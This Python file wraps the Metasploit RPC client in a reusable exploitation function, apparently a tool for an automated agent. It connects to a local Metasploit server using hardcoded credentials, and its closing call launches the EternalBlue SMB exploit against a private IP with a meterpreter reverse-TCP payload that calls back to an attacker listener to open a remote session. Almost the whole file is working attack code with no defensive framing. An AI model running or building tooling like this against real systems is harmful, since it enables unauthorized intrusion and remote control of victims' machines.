from pymetasploit3.msfrpc import MsfRpcClient
import time


def metasploit_tool(target_ip: str, exploit: str, payload: str, options: dict):
    """
    Metasploit exploitation tool to exploit a target using a specified exploit and payload.

    Args:
        target_ip (str): The target IP address.
        exploit (str): The Metasploit exploit module to use (e.g., "exploit/windows/smb/ms17_010_eternalblue").
        payload (str): The Metasploit payload to use (e.g., "windows/meterpreter/reverse_tcp").
        options (dict): Additional options for the exploit (e.g., LHOST, LPORT).

    Returns:
        str: The result of the exploitation attempt.
    """
    try:
        # Connect to Metasploit RPC server
        client = MsfRpcClient(password='msfpassword', username='yns', port=55559, server='127.0.0.1', ssl=False)


        # Use the specified exploit
        exploit_module = client.modules.use('exploit', exploit)
        exploit_module['RHOSTS'] = target_ip

        # Set the payload
        payload_module = client.modules.use('payload', payload)
        for key, value in options.items():
            payload_module[key] = value

        # Execute the exploit
        print(f"Running exploit {exploit} against {target_ip}...")
        job_id = exploit_module.execute(payload=payload_module)

        # Wait for the exploit to complete
        while client.jobs.list:
            print("Exploit running...")
            time.sleep(5)

        # Check for sessions
        if client.sessions.list:
            session_id = list(client.sessions.list.keys())[0]
            session = client.sessions.session(session_id)
            return f"Exploit successful! Session ID: {session_id}\nSession Info: {session.info}"
        else:
            return "Exploit failed. No session created."

    except Exception as e:
        return f"Error running Metasploit tool: {str(e)}"
    

result = metasploit_tool(
    target_ip="192.168.0.100",
    exploit="exploit/windows/smb/ms17_010_eternalblue",
    payload="windows/meterpreter/reverse_tcp",
    options={
        "LHOST": "192.168.0.115",
        "LPORT": "4444"
    }
)
print(result)